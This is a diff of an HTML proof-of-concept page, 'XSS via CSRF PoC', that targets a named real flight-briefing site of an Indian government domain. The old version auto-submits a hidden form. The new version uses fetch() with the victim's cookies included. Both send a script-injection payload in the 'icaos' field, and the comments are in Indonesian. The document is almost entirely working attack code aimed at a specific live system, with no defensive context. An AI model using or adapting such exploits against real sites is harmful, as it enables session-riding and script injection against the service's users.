@@ -5,15 +5,34 @@
 </head>
 <body>
       <h3>XSS via CSRF PoC by t0m1irv4n</h3>
-      <form action="https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/#showMetars" method="post">
-      <input type="hidden" name="icaos" value="HOLA&quot;>><</p><script>alert(`XSS`)</script>" />
-    <input type="hidden" name="type" value="taf" />
-          <input type="submit" value="Submit request" />
-      </form>
-      <script>
-          history.pushState('', '', '/');
-          document.forms[0].submit();
-      </script>
+      <button id="exploitBtn">Klik untuk Eksploitasi</button>
+      <div id="status"></div>
+
+    <script>
+        document.getElementById('exploitBtn').addEventListener('click', function() {
+            var url = 'https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showopmetquery.php';
+            var params = 'icaos=HOLA%22%3E%3E%3C%3C%2Fp%3E%3Cscript%3Ealert(%60XSS%60)%3C%2Fscript%3E&type=taf';
+
+            fetch(url, {
+                method: 'POST',
+                mode: 'cors', // Mencoba melakukan request lintas domain
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'X-Requested-With': 'XMLHttpRequest' // Header yang DIWAJIBKAN server
+                },
+                body: params,
+                credentials: 'include' // PENTING: Untuk mengirim cookies/session korban
+            })
+            .then(response => {
+                document.getElementById('status').innerText = 'Request Terkirim. Cek Network Tab.';
+                console.log('Response:', response);
+            })
+            .catch(error => {
+                document.getElementById('status').innerText = 'Gagal (Kemungkinan diblokir CORS). Cek Console/Network Tab.';
+                console.error('Error:', error);
+            });
+        });
+    </script>
   </body>
 </html>
 
